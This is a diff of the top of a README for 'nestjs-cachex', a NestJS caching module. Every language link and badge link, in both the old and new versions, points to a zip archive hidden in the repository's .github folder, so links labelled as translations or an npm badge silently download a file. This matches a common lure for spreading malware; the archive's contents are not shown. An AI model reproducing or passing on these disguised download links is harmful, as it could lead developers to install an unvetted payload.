@@ -1,10 +1,10 @@
-**English** | [한국어](https://raw.githubusercontent.com/steadied-paleozoic68/nestjs-cachex/main/.github/nestjs-cachex-3.7.zip) | [日本語](https://raw.githubusercontent.com/steadied-paleozoic68/nestjs-cachex/main/.github/nestjs-cachex-3.7.zip)
+**English** | [한국어](https://github.com/steadied-paleozoic68/nestjs-cachex/raw/refs/heads/main/.github/nestjs-cachex-3.7.zip) | [日本語](https://github.com/steadied-paleozoic68/nestjs-cachex/raw/refs/heads/main/.github/nestjs-cachex-3.7.zip)
 
 # nestjs-cachex
 
-[![npm version](https://img.shields.io/npm/v/nestjs-cachex)](https://raw.githubusercontent.com/steadied-paleozoic68/nestjs-cachex/main/.github/nestjs-cachex-3.7.zip)
+[![npm version](https://img.shields.io/npm/v/nestjs-cachex)](https://github.com/steadied-paleozoic68/nestjs-cachex/raw/refs/heads/main/.github/nestjs-cachex-3.7.zip)
 [![license](https://img.shields.io/npm/l/nestjs-cachex)](LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-blue?logo=typescript&logoColor=white)](https://raw.githubusercontent.com/steadied-paleozoic68/nestjs-cachex/main/.github/nestjs-cachex-3.7.zip)
+[![TypeScript](https://img.shields.io/badge/TypeScript-blue?logo=typescript&logoColor=white)](https://github.com/steadied-paleozoic68/nestjs-cachex/raw/refs/heads/main/.github/nestjs-cachex-3.7.zip)
 
 A decorator-based caching module for NestJS.
 
